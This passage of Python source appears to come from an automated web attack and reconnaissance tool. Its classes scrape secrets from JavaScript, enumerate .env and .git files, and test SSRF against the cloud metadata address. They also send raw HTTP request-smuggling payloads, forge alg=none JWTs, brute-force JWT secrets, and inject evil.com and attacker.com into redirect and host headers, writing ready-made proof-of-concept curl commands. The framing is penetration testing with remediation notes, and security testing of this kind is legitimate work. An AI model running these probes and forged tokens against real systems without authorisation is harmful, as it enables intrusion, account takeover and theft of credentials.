            _, content, _ = _fetch(jf, cfg.user_agent, cfg.timeout)
            if not content: continue
            for pat in self.EP_PATTERNS:
                for m in re.findall(pat, content, re.I):
                    if len(m) > 3: eps.add(m)
            for m in re.findall(r'[?&]([a-zA-Z_][a-zA-Z0-9_]*)=', content):
                if len(m) > 2: params.add(m)
            # Detect JWT tokens in JS
            for m in re.findall(r'eyJ[0-9a-zA-Z_-]+\.[0-9a-zA-Z_-]+\.[0-9a-zA-Z_-]+', content):
                try:
                    parts = m.split('.')
                    payload = json.loads(base64.b64decode(parts[1] + "==").decode('utf-8','replace'))
                    profile.jwt_tokens.append({"raw": m[:40], "payload": payload, "source": jf})
                    warn(f"  JWT found in JS: {payload}")
                except Exception: pass
        profile.api_endpoints.extend(list(eps)[:50])
        profile.parameters = sorted(params)[:100]
        ok(f"  {len(eps)} endpoints, {len(params)} parameters")
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 12: SOURCEMAP ANALYZER  (SKILL-12)
# ══════════════════════════════════════════════════════════════
class SourcemapAnalyzer:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("SOURCEMAP-12: Webpack sourcemap exposure detection")
        found = []
        for js_url in profile.js_files[:10]:
            map_url = js_url + ".map"
            code, body, _ = _fetch(map_url, cfg.user_agent, cfg.timeout)
            if code == 200 and ('"sources"' in body or '"mappings"' in body):
                high(f"  SOURCEMAP EXPOSED: {map_url}")
                found.append(map_url)
                try:
                    sm = json.loads(body)
                    srcs = sm.get("sources", [])
                    hot = [s for s in srcs if re.search(r'secret|key|token|config|auth|password', s, re.I)]
                    if hot: high(f"  Sensitive sources: {hot[:5]}")
                except Exception: pass
        if found:
            profile.findings.append(Finding(
                id="F-SRC-001", title="Exposed Webpack Sourcemaps",
                severity="MEDIUM", cwe="CWE-540", cvss=5.3,
                description=f"{len(found)} sourcemap(s) publicly accessible — full source code exposed.",
                evidence="\n".join(found),
                reproduction=f"curl -s '{found[0]}' | python3 -c \"import sys,json;d=json.load(sys.stdin);print('\\n'.join(d.get('sources',[])))\"",
                poc_curl=f"curl -sk '{found[0]}'",
                category="Information Disclosure",
                remediation="Disable sourcemap output in production webpack config."
            ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 13: SECRET SCANNER  (SKILL-13)
# ══════════════════════════════════════════════════════════════
class SecretScanner:
    PATTERNS = {
        "AWS Access Key":   (r"AKIA[0-9A-Z]{16}", 3.0),
        "Google API Key":   (r"AIza[0-9A-Za-z\-_]{35}", 3.5),
        "GitHub Token":     (r"ghp_[0-9a-zA-Z]{36}|github_pat_[0-9a-zA-Z_]{82}", 3.5),
        "Slack Token":      (r"xox[baprs]-[0-9a-zA-Z\-]{10,}", 3.5),
        "Stripe Secret":    (r"sk_live_[0-9a-zA-Z]{24}", 4.0),
        "SendGrid Key":     (r"SG\.[0-9a-zA-Z\-_.]{22}\.[0-9a-zA-Z\-_.]{43}", 4.0),
        "JWT Token":        (r"eyJ[0-9a-zA-Z_-]+\.[0-9a-zA-Z_-]+\.[0-9a-zA-Z_-]+", 3.0),
        "Bearer Token":     (r"[Bb]earer\s+[0-9a-zA-Z\-_.~+/]+=*", 2.5),
        "Private Key":      (r"-----BEGIN (RSA|EC|PGP|DSA) PRIVATE KEY", 0.0),
        "Zendesk Token":    (r"(?i)zendesk.{0,10}['\"][0-9a-zA-Z_\-]{20,}['\"]", 2.5),
        "Generic API Key":  (r"(?i)(api_key|apikey|access_key|auth_token)\s*[:=]\s*['\"][^'\"]{16,}['\"]", 3.0),
        "Generic Password": (r"(?i)(password|passwd|pwd)\s*[:=]\s*['\"][^'\"]{8,}['\"]", 2.5),
        "Database URL":     (r"(?i)(mysql|postgres|mongodb|redis)://[^'\"\s<>]+", 2.0),
        "S3 Bucket":        (r"s3://[a-zA-Z0-9\-_.]+|s3\.amazonaws\.com/[a-zA-Z0-9\-_.]+", 2.0),
        "Internal IP":      (r"\b(?:192\.168|10\.\d+|172\.(?:1[6-9]|2\d|3[01]))\.\d+\.\d+\b", 1.5),
        "OAuth Client ID":  (r"(?i)client_id\s*[:=]\s*['\"][0-9a-zA-Z\-_\.]{16,}['\"]", 2.5),
        "Firebase URL":     (r"https://[a-z0-9\-]+\.firebaseio\.com", 2.0),
        "IDOR Pattern":     (r"(?i)/(?:ticket|order|invoice|booking|user|account)/(\d{4,})", 1.0),
        "Email Address":    (r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}", 1.5),
        "Twilio SID":       (r"AC[0-9a-fA-F]{32}", 3.5),
        "Salesforce Token": (r"(?i)salesforce.{0,20}['\"][0-9a-zA-Z._\-]{30,}['\"]", 2.5),
        "Freshdesk Key":    (r"(?i)freshdesk.{0,10}['\"][0-9a-zA-Z_\-]{20,}['\"]", 2.5),
        "Debug Info":       (r"(?i)(stack trace at .{10,}|traceback \(most recent|error at line \d)", 3.5),
        "npm Token":        (r"npm_[a-zA-Z0-9]{36}", 4.0),
        "PyPI Token":       (r"pypi-[a-zA-Z0-9\-_]{100,}", 4.0),
    }

    def _entropy(self, s: str) -> float:
        if not s: return 0.0
        c = Counter(s); n = len(s)
        return -sum((v/n)*math.log2(v/n) for v in c.values())

    def _scan(self, text: str, source: str) -> List[Dict]:
        found = []
        for name, (pat, min_e) in self.PATTERNS.items():
            for m in re.finditer(pat, text):
                val = m.group(0)
                if self._entropy(val) >= min_e or min_e == 0.0:
                    found.append({"type":name,"value":val[:80],"source":source,
                                  "entropy":round(self._entropy(val),2)})
        return found

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("SECRETS-13: Credential scanning + Shannon entropy (25 patterns)")
        all_s = []
        for src_url in [profile.url] + profile.js_files[:10]:
            _, content, _ = _fetch(src_url, cfg.user_agent, cfg.timeout)
            if content:
                secs = self._scan(content, src_url)
                all_s.extend(secs)
                for s in secs: high(f"  SECRET [{s['type']}]: {s['value'][:60]}")
        profile.secrets = all_s
        if all_s:
            crit = [s for s in all_s if s["type"] in
                    ["AWS Access Key","Private Key","GitHub Token","Stripe Secret","npm Token"]]
            profile.findings.append(Finding(
                id="F-SEC-001", title="Exposed Secrets in JavaScript",
                severity="CRITICAL" if crit else "HIGH", cwe="CWE-798",
                cvss=9.8 if crit else 7.5,
                description=f"{len(all_s)} credential patterns detected in JS/HTML.",
                evidence="\n".join(f"{s['type']}: {s['value'][:60]}" for s in all_s[:5]),
                reproduction=f"curl -s '{all_s[0]['source']}' | grep -iE 'key|token|secret|password'",
                poc_curl=f"curl -sk '{all_s[0]['source']}'",
                category="Information Disclosure",
                remediation="Remove all secrets from client-side code. Use server-side env vars."
            ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 14: API MAPPER  (SKILL-14)
# ══════════════════════════════════════════════════════════════
class APIMapper:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("API-14: API endpoint discovery + Swagger/OpenAPI detection")
        base = profile.url.rstrip("/")
        found = []
        for path in WORDLIST_API_PATHS[:60]:
            code, body, _ = _fetch(base + path, cfg.user_agent, cfg.timeout)
            if code in [200,201,400,401,403,405]:
                found.append({"path":path,"code":code})
                col = C.GREEN if code==200 else C.YELLOW
                print(f"  {col}[{code}]{C.NC} {path}")
                if code == 200 and re.search(r'"openapi"|"swagger"|"paths"', body, re.I):
                    high(f"  API SPEC EXPOSED: {path}")
                    profile.findings.append(Finding(
                        id=f"F-API-{len(profile.findings):03d}",
                        title="Exposed API Documentation (Swagger/OpenAPI)",
                        severity="INFO", cwe="CWE-200", cvss=5.3,
                        description="API specification publicly accessible.",
                        evidence=f"URL: {base+path} | HTTP {code}",
                        reproduction=f"curl -s '{base+path}' | python3 -m json.tool",
                        poc_curl=f"curl -sk '{base+path}'",
                        category="Information Disclosure",
                        remediation="Restrict API docs to authenticated/internal users."
                    ))
        profile.api_endpoints.extend([p["path"] for p in found if p["code"]==200])
        ok(f"  {len(found)} API paths responded")
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 15: GRAPHQL PROBER  (SKILL-15)
# ══════════════════════════════════════════════════════════════
class GraphQLProber:
    PATHS = ["/graphql","/graphiql","/api/graphql","/v1/graphql","/gql","/query","/playground"]
    IQ = json.dumps({"query":"{__schema{types{name fields{name type{name kind}}}}}"})

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("GRAPHQL-15: Introspection + schema extraction")
        base = profile.url.rstrip("/")
        for path in self.PATHS:
            url = base + path
            code, body, _ = _fetch(url, cfg.user_agent, cfg.timeout,
                                   method="POST", data=self.IQ.encode(),
                                   headers_extra={"Content-Type":"application/json",
                                                  "Accept":"application/json"})
            if code == 200 and '"__schema"' in body:
                profile.graphql_endpoints.append(url)
                high(f"  GRAPHQL INTROSPECTION: {url}")
                try:
                    d = json.loads(body)
                    types = d["data"]["__schema"]["types"]
                    user_types = [t["name"] for t in types if not t["name"].startswith("__")]
                    ok(f"  Types ({len(user_types)}): {user_types[:10]}")
                except Exception: pass
                profile.findings.append(Finding(
                    id="F-GQL-001", title="GraphQL Introspection Enabled",
                    severity="HIGH", cwe="CWE-200", cvss=7.5,
                    description="GraphQL introspection exposes full API schema.",
                    evidence=f"URL: {url}",
                    reproduction=f"curl -X POST '{url}' -H 'Content-Type: application/json' -d '{{\"query\":\"{{__schema{{types{{name}}}}}}\"}}'",
                    poc_curl=f"curl -sk -X POST '{url}' -H 'Content-Type: application/json' -d '{{\"query\":\"{{__schema{{types{{name}}}}}}\"}}' | python3 -m json.tool",
                    category="GraphQL",
                    remediation="Disable introspection in production. Use query depth/complexity limits."
                ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 16: PATH PROBER  (SKILL-16)
# ══════════════════════════════════════════════════════════════
class PathProber:
    CRITICAL_PATHS = {"/.env","/.git/HEAD","/.git/config","/config.json",
                      "/server-status","/.htpasswd","/.htaccess"}

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("PATHS-16: Sensitive file/directory enumeration (50+ paths)")
        base = profile.url.rstrip("/")
        for path in WORDLIST_API_PATHS:
            is_api = any(path.startswith(p) for p in ["/api","/v","/graphql","/rest",
                         "/swagger","/openapi","/redoc","/actuator","/oauth"])
            if not is_api and path not in self.CRITICAL_PATHS:
                continue
            code, body, _ = _fetch(base + path, cfg.user_agent, cfg.timeout)
            if code == 200 and len(body) > 0:
                profile.sensitive_paths.append(path)
                high(f"  EXPOSED [{code}]: {path} ({len(body)}b)")
                if path in self.CRITICAL_PATHS:
                    profile.findings.append(Finding(
                        id=f"F-PATH-{len(profile.findings):03d}",
                        title=f"Critical File Exposed: {path}",
                        severity="CRITICAL" if "env" in path or ".git" in path else "HIGH",
                        cwe="CWE-538", cvss=9.1 if ".env" in path else 7.5,
                        description=f"Sensitive file '{path}' publicly accessible.",
                        evidence=f"URL: {base+path} | Size: {len(body)}b | Preview: {body[:80]}",
                        reproduction=f"curl -s '{base+path}'",
                        poc_curl=f"curl -sk '{base+path}'",
                        category="Information Disclosure",
                        remediation=f"Block access to '{path}' via server config."
                    ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 17: S3 BUCKET CHECKER  (SKILL-17)
# ══════════════════════════════════════════════════════════════
class S3BucketChecker:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("S3-17: S3 bucket enumeration + permission testing")
        apex = profile.apex; host = profile.host
        candidates = [
            apex.replace(".","-"), host.replace(".","-"),
            f"{apex.replace('.', '-')}-static", f"{apex.replace('.', '-')}-assets",
            f"{apex.replace('.', '-')}-uploads", f"{apex.replace('.', '-')}-backup",
            f"{host.split('.')[0]}-static", f"{host.split('.')[0]}-prod",
        ]
        for bucket in candidates:
            url = f"https://{bucket}.s3.amazonaws.com/"
            code, body, _ = _fetch(url, cfg.user_agent, cfg.timeout)
            if code == 200:
                profile.s3_buckets.append(bucket)
                if "<ListBucketResult" in body:
                    high(f"  S3 LISTABLE: {url}")
                    profile.findings.append(Finding(
                        id=f"F-S3-{len(profile.findings):03d}",
                        title="S3 Bucket Publicly Listable",
                        severity="HIGH", cwe="CWE-732", cvss=7.5,
                        description=f"S3 bucket '{bucket}' allows public object listing.",
                        evidence=f"URL: {url}", reproduction=f"curl -s '{url}'",
                        poc_curl=f"curl -sk '{url}'",
                        category="Cloud Misconfiguration",
                        remediation="Enable S3 Block Public Access. Remove public-read ACL."
                    ))
                else: warn(f"  S3 accessible (not listable): {bucket}")
            elif code == 403:
                warn(f"  S3 exists (403 forbidden): {bucket}")
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 18: SUBDOMAIN TAKEOVER  (SKILL-18)
# ══════════════════════════════════════════════════════════════
class SubdomainTakeoverDetector:
    FINGERPRINTS = {
        "GitHub Pages":  ["There isn't a GitHub Pages site here"],
        "Heroku":        ["No such app","herokuapp.com"],
        "Netlify":       ["Not Found - Request ID"],
        "AWS S3":        ["NoSuchBucket","The specified bucket does not exist"],
        "Azure":         ["404 Web Site not found"],
        "Shopify":       ["Sorry, this shop is currently unavailable"],
        "Zendesk":       ["Help Center Closed"],
        "Fastly":        ["Fastly error: unknown domain"],
        "Surge.sh":      ["project not found"],
        "Pantheon":      ["404 error unknown site"],
        "Sendgrid":      ["The provided CNAME does not point"],
    }

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("TAKEOVER-18: Subdomain takeover (11 provider fingerprints)")
        resolver = DNSResolver()
        all_subs = list(set(profile.subdomains + profile.ct_subdomains))[:25]
        takeovers = []
        for sub in all_subs:
            ip = resolver.resolve(sub)
            if ip == "NXDOMAIN": continue
            code, body, _ = _fetch(f"https://{sub}", cfg.user_agent, 8)
            for provider, sigs in self.FINGERPRINTS.items():
                for sig in sigs:
                    if sig.lower() in body.lower():
                        high(f"  TAKEOVER CANDIDATE: {sub} ({provider})")
                        takeovers.append({"subdomain":sub,"provider":provider})
        if takeovers:
            profile.findings.append(Finding(
                id="F-TKO-001", title="Subdomain Takeover Candidates",
                severity="HIGH", cwe="CWE-284", cvss=8.1,
                description=f"{len(takeovers)} subdomains may be takeable.",
                evidence="\n".join(f"{t['subdomain']}: {t['provider']}" for t in takeovers),
                reproduction="\n".join(f"curl -sk https://{t['subdomain']}/" for t in takeovers[:3]),
                poc_curl=f"curl -sk 'https://{takeovers[0]['subdomain']}/'",
                category="Subdomain Takeover",
                remediation="Remove CNAME records pointing to unclaimed external services."
            ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 19: SSRF + OPEN REDIRECT  (SKILL-19)
# ══════════════════════════════════════════════════════════════
class SSRFDetector:
    SSRF_PARAMS = ["url","redirect","next","return","returnurl","goto","link","target",
                   "redir","redirect_uri","callback","feed","host","fetch","path","file",
                   "resource","src","dest","destination","from","origin","webhook",
                   "endpoint","proxy","uri","view","site","page","image_url","img_url"]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("SSRF-19: SSRF parameter identification + open redirect testing")
        # Find params in Wayback URLs
        candidates = []
        for url in profile.wayback_urls[:150]:
            params = parse_qs(urlparse(url).query)
            for p in params:
                if p.lower() in self.SSRF_PARAMS:
                    candidates.append({"param":p,"url":url})
                    warn(f"  SSRF-prone param '{p}': {url[:70]}")
        # Test current page params for open redirect
        for param in self.SSRF_PARAMS[:10]:
            test = f"{profile.url}?{param}=https://evil.com"
            code, _, hdrs = _fetch(test, cfg.user_agent, 5)
            loc = hdrs.get("location","")
            if "evil.com" in loc and code in [301,302,303,307,308]:
                high(f"  OPEN REDIRECT: ?{param}=https://evil.com → {loc}")
                profile.open_redirects.append(test)
        profile.ssrf_params = [c["param"] for c in candidates]
        if candidates:
            profile.findings.append(Finding(
                id="F-SSRF-001", title="SSRF-Prone Parameters Identified",
                severity="HIGH", cwe="CWE-918", cvss=8.6,
                description=f"{len(candidates)} URL/redirect params found in historical URLs.",
                evidence="\n".join(f"{c['param']}: {c['url'][:70]}" for c in candidates[:5]),
                reproduction="\n".join(f"curl -s '{c['url'].split('?')[0]}?{c['param']}=http://169.254.169.254/latest/meta-data/'" for c in candidates[:2]),
                poc_curl=f"curl -sk '{candidates[0]['url'].split('?')[0]}?{candidates[0]['param']}=http://169.254.169.254/latest/meta-data/'",
                category="SSRF",
                remediation="Validate URL params against allowlist. Block RFC1918 + metadata IPs."
            ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 20: IDOR + XSS SURFACE  (SKILL-20, SKILL-21)
# ══════════════════════════════════════════════════════════════
class IDORMapper:
    IDOR_PATS = [
        r"/(?:user|account|ticket|order|invoice|booking|request|card)/(\d+)",
        r"[?&](?:id|user_id|ticket_id|order_id|account_id)=(\d+)",
        r"/(\d{4,})",
        r"/[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("IDOR-20: IDOR pattern mapping + XSS surface identification")
        # IDOR from Wayback URLs
        seen = set(); idor_candidates = []
        for url in list(profile.wayback_urls)[:300] + list(profile.api_endpoints):
            for pat in self.IDOR_PATS:
                if re.search(pat, url, re.I):
                    key = re.sub(r'\d+', 'N', url)
                    if key not in seen:
                        seen.add(key); idor_candidates.append(url)
                    break
        if idor_candidates:
            warn(f"  {len(idor_candidates)} IDOR-susceptible URL patterns")
            for c in idor_candidates[:5]: warn(f"    {c[:80]}")
            profile.findings.append(Finding(
                id="F-IDOR-001", title="IDOR Patterns Detected",
                severity="HIGH", cwe="CWE-639", cvss=8.1,
                description=f"{len(idor_candidates)} URL patterns use sequential/guessable IDs.",
                evidence="\n".join(idor_candidates[:5]),
                reproduction="\n".join(f"# Increment ID in: {c[:60]}" for c in idor_candidates[:2]),
                poc_curl="\n".join("curl -sk '" + re.sub(r'(\d+)', lambda m: str(int(m.group(0))+1), c) + "'" for c in idor_candidates[:2] if re.search(r'\d+', c)),
                category="IDOR",
                remediation="Use unpredictable UUIDs. Enforce server-side ownership checks."
            ))
        # XSS surface
        _, html_body, _ = _fetch(profile.url, cfg.user_agent, cfg.timeout)
        forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>', html_body, re.I)
        inputs = re.findall(r'<input[^>]*type=["\'](?:text|search|email|url|tel)["\'][^>]*>', html_body, re.I)
        profile.forms = [{"action": a} for a in forms]
        if inputs or forms:
            ok(f"  XSS surface: {len(forms)} forms, {len(inputs)} text inputs")
            profile.findings.append(Finding(
                id="F-XSS-001", title="XSS Injection Surface Identified",
                severity="MEDIUM", cwe="CWE-79", cvss=6.1,
                description=f"Found {len(inputs)} text inputs and {len(forms)} forms.",
                evidence=f"Forms: {forms[:3]}\nPayloads to test: {PAYLOADS_XSS[:3]}",
                reproduction="# Test each input:\n" + "\n".join(PAYLOADS_XSS[:3]),
                poc_curl=f"# Manual test required at {profile.url}",
                category="XSS Surface",
                remediation="Encode all output. Strict CSP. Server-side input validation."
            ))
        return profile


# ══════════════════════════════════════════════════════════════
# TOOL 21: HTTP REQUEST SMUGGLING DETECTOR  (SKILL-31)
# ══════════════════════════════════════════════════════════════
class HTTPSmugglingDetector:
    """Detect CL.TE, TE.CL, TE.TE via timing + differential responses."""

    def _raw_request(self, host: str, port: int, payload: bytes, timeout: int) -> Tuple[int, str]:
        try:
            s = socket.create_connection((host, port), timeout=timeout)
            if port == 443:
                ctx = _ssl_ctx()
                s = ctx.wrap_socket(s, server_hostname=host)
            s.sendall(payload)
            resp = b""
            s.settimeout(timeout)
            try:
                while True:
                    chunk = s.recv(4096)
                    if not chunk: break
                    resp += chunk
                    if len(resp) > 20000: break
            except socket.timeout: pass
            s.close()
            decoded = resp.decode("utf-8", errors="replace")
            code = 0
            m = re.search(r"HTTP/\S+ (\d+)", decoded)
            if m: code = int(m.group(1))
            return code, decoded
        except Exception as e:
            return 0, str(e)

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("SMUGGLING-21: HTTP Request Smuggling (CL.TE / TE.CL / TE.TE)")
        host = profile.host
        port = 443 if profile.scheme == "https" else 80
        path = urlparse(profile.url).path or "/"
        results = []

        # CL.TE test — Content-Length short, Transfer-Encoding chunked
        cl_te = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: close\r\n\r\n"
            f"0\r\n\r\nX"
        ).encode()

        # TE.CL test — Transfer-Encoding chunked, Content-Length large
        te_cl = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: close\r\n\r\n"
            f"5e\r\n"
            f"POST {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 15\r\n\r\n"
            f"SMUGGLED=true\r\n0\r\n\r\n"
        ).encode()

        for label, payload in [("CL.TE", cl_te), ("TE.CL", te_cl)]:
            t0 = time.time()
            code, resp = self._raw_request(host, port, payload, 8)
            elapsed = time.time() - t0
            results.append({"type": label, "code": code, "time": round(elapsed, 2), "hint": ""})
            if elapsed > 5:
                high(f"  SMUGGLING [{label}]: Timeout {elapsed:.1f}s — possible desync!")
                results[-1]["hint"] = "TIMEOUT — possible desync"
            elif code in [400, 500]:
                warn(f"  SMUGGLING [{label}]: HTTP {code} — server error (investigate manually)")
                results[-1]["hint"] = f"HTTP {code}"
            else:
                info(f"  SMUGGLING [{label}]: HTTP {code} in {elapsed:.1f}s")

        profile.smuggling_results = results
        timeout_hits = [r for r in results if "TIMEOUT" in r.get("hint","")]
        if timeout_hits:
            profile.findings.append(Finding(
                id="F-SMG-001", title="HTTP Request Smuggling Indicator",
                severity="HIGH", cwe="CWE-444", cvss=8.1,
                description="Timing-based detection suggests request desync vulnerability.",
                evidence="\n".join(f"{r['type']}: {r['code']} in {r['time']}s — {r['hint']}" for r in results),
                reproduction=(
                    f"# CL.TE test (manual verification required):\n"
                    f"curl -sk -X POST '{profile.url}' \\\n"
                    f"  -H 'Content-Length: 6' \\\n"
                    f"  -H 'Transfer-Encoding: chunked' \\\n"
                    f"  -d $'0\\r\\n\\r\\nX'"
                ),
                poc_curl=f"# See Burp Suite > HTTP Request Smuggler extension for verification",
                category="HTTP Smuggling",
                remediation="Use HTTP/2 end-to-end. Disable chunked encoding at the edge."
            ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 22: JWT VULNERABILITY SCANNER  (SKILL-32)
# ══════════════════════════════════════════════════════════════
class JWTScanner:
    """alg=none, RS256→HS256 confusion, weak secret brute-force."""

    def _decode_jwt(self, token: str) -> Tuple[Dict, Dict]:
        try:
            parts = token.split(".")
            header  = json.loads(base64.b64decode(parts[0] + "==").decode("utf-8","replace"))
            payload = json.loads(base64.b64decode(parts[1] + "==").decode("utf-8","replace"))
            return header, payload
        except Exception:
            return {}, {}

    def _forge_none(self, token: str) -> str:
        parts = token.split(".")
        header = json.loads(base64.b64decode(parts[0] + "==").decode("utf-8","replace"))
        header["alg"] = "none"
        new_header = base64.urlsafe_b64encode(json.dumps(header,separators=(',',':')).encode()).rstrip(b"=").decode()
        return f"{new_header}.{parts[1]}."

    def _brute_secret(self, token: str) -> Optional[str]:
        import hmac
        parts = token.split(".")
        msg = f"{parts[0]}.{parts[1]}".encode()
        try:
            sig = base64.urlsafe_b64decode(parts[2] + "==")
        except Exception:
            return None
        for secret in WORDLIST_JWT_SECRETS:
            candidate = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
            if candidate == sig:
                return secret
        return None

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("JWT-22: JWT alg=none, RS256→HS256, weak secret brute-force")
        if not profile.jwt_tokens:
            info("  No JWT tokens found in JS — scanning responses...")
            _, body, hdrs = _fetch(profile.url, cfg.user_agent, cfg.timeout)
            combined = body + str(hdrs)
            for m in re.finditer(r'eyJ[0-9a-zA-Z_-]+\.[0-9a-zA-Z_-]+\.[0-9a-zA-Z_-]+', combined):
                try:
                    h, p = self._decode_jwt(m.group(0))
                    if h: profile.jwt_tokens.append({"raw": m.group(0), "header": h, "payload": p})
                except Exception: pass

        for token_info in profile.jwt_tokens[:5]:
            raw = token_info.get("raw","")
            if not raw or "." not in raw: continue
            h, p = self._decode_jwt(raw)
            ok(f"  JWT found: alg={h.get('alg','?')} sub={p.get('sub','?')} exp={p.get('exp','?')}")
            issues = []
            # Check expired
            exp = p.get("exp", 0)
            if exp and exp < time.time():
                warn(f"  JWT already expired (exp={exp}) — test if server still accepts it")
                issues.append("expired_accepted")
            # Check none alg
            alg = h.get("alg","").upper()
            if alg == "NONE":
                high("  JWT alg=none — signature not verified!")
                issues.append("alg_none")
            elif alg == "RS256":
                warn("  JWT RS256 — test HS256 confusion attack")
                issues.append("rs256_confusion_candidate")
            # Weak secret
            if alg.startswith("HS"):
                secret = self._brute_secret(raw)
                if secret:
                    high(f"  JWT WEAK SECRET: '{secret}'")
                    issues.append(f"weak_secret:{secret}")
            if issues:
                forged = self._forge_none(raw)
                profile.findings.append(Finding(
                    id=f"F-JWT-{len(profile.findings):03d}",
                    title="JWT Vulnerability Detected",
                    severity="CRITICAL" if "weak_secret" in str(issues) or "alg_none" in issues else "HIGH",
                    cwe="CWE-347", cvss=9.1 if "weak_secret" in str(issues) else 8.1,
                    description=f"JWT issues: {issues}",
                    evidence=f"Token: {raw[:60]}...\nHeader: {h}\nPayload: {p}",
                    reproduction=f"# alg=none forged token:\n{forged}\n# Use in Authorization: Bearer <token>",
                    poc_curl=f"curl -sk '{profile.url}' -H 'Authorization: Bearer {forged}'",
                    category="JWT",
                    remediation="Use RS256. Reject alg=none. Use long random secrets. Verify expiry."
                ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 23: OAUTH 2.0 ANALYZER  (SKILL-33)
# ══════════════════════════════════════════════════════════════
class OAuthAnalyzer:
    OIDC_PATHS = ["/.well-known/openid-configuration", "/.well-known/oauth-authorization-server",
                  "/oauth/authorize", "/oauth/token", "/api/oauth", "/api/auth/oauth"]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("OAUTH-23: OAuth 2.0 flow analysis (state, PKCE, redirect_uri)")
        base = profile.url.rstrip("/")
        oidc_config = {}
        issues = []

        for path in self.OIDC_PATHS:
            code, body, _ = _fetch(base + path, cfg.user_agent, cfg.timeout)
            if code == 200 and ('"authorization_endpoint"' in body or '"token_endpoint"' in body):
                high(f"  OIDC CONFIG EXPOSED: {path}")
                profile.oauth_endpoints.append(base + path)
                try: oidc_config = json.loads(body)
                except Exception: pass
                ok(f"  Auth endpoint: {oidc_config.get('authorization_endpoint','?')}")
                ok(f"  Token endpoint: {oidc_config.get('token_endpoint','?')}")

                # Check for implicit flow support (token in URL = bad)
                resp_types = oidc_config.get("response_types_supported", [])
                if "token" in resp_types:
                    high("  Implicit flow supported — access_token exposed in URL!")
                    issues.append("implicit_flow")

                # Check PKCE requirement
                pkce = oidc_config.get("code_challenge_methods_supported", [])
                if not pkce:
                    warn("  PKCE not advertised — authorization code interception risk")
                    issues.append("no_pkce")

        # Check for missing state in OAuth flows in HTML/JS
        _, html_body, _ = _fetch(profile.url, cfg.user_agent, cfg.timeout)
        oauth_links = re.findall(r'href=["\'][^"\']*(?:oauth|authorize)[^"\']*["\']', html_body, re.I)
        for link in oauth_links[:5]:
            if "state=" not in link:
                high(f"  OAuth link missing state param (CSRF): {link[:80]}")
                issues.append("missing_state")

        if issues:
            profile.findings.append(Finding(
                id="F-OAUTH-001", title="OAuth 2.0 Misconfiguration",
                severity="HIGH", cwe="CWE-352", cvss=8.1,
                description=f"OAuth issues: {list(set(issues))}",
                evidence=f"OIDC config: {oidc_config.get('issuer','?')}\nIssues: {issues}",
                reproduction=(
                    "# Missing state CSRF test:\n"
                    f"curl -sk '{base}/oauth/authorize?client_id=X&response_type=code&redirect_uri=https://attacker.com'"
                ),
                poc_curl=f"curl -sk '{base}/oauth/authorize?response_type=token&client_id=test&redirect_uri=https://attacker.com'",
                category="OAuth",
                remediation="Require state param. Enforce PKCE. Disable implicit flow. Whitelist redirect_uri."
            ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 24: HOST HEADER INJECTION  (SKILL-34)
# ══════════════════════════════════════════════════════════════
class HostHeaderInjector:
    INJECTIONS = [
        ("X-Forwarded-Host",    "evil.com"),
        ("X-Host",              "evil.com"),
        ("X-Forwarded-Server",  "evil.com"),
        ("X-HTTP-Host-Override","evil.com"),
        ("Forwarded",           "host=evil.com"),
        ("Host",                "evil.com"),
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("HOST-24: Host header injection (password reset poisoning + cache)")
        host = profile.host
        vulns = []
        for header, value in self.INJECTIONS:
            code, body, hdrs = _fetch(profile.url, cfg.user_agent, cfg.timeout,
                                      headers_extra={header: value})
            # Look for injection reflected in response
            if "evil.com" in body:
                high(f"  HOST INJECTION REFLECTED: {header}: {value}")
                vulns.append({"header": header, "value": value, "reflected": True})
            # Check password reset path
            reset_url = profile.url.rstrip("/") + "/password/reset"
            r_code, r_body, r_hdrs = _fetch(reset_url, cfg.user_agent, cfg.timeout,
                                            headers_extra={header: value})
            if "evil.com" in r_body or (r_code == 200 and "email" in r_body.lower()):
                high(f"  PASSWORD RESET POISONING candidate via {header}")
                vulns.append({"header": header, "value": value, "vector": "password_reset"})

        if vulns:
            profile.findings.append(Finding(
                id="F-HOST-001", title="Host Header Injection",
                severity="HIGH", cwe="CWE-601", cvss=8.1,
                description=f"Host header injection reflected via {[v['header'] for v in vulns]}.",
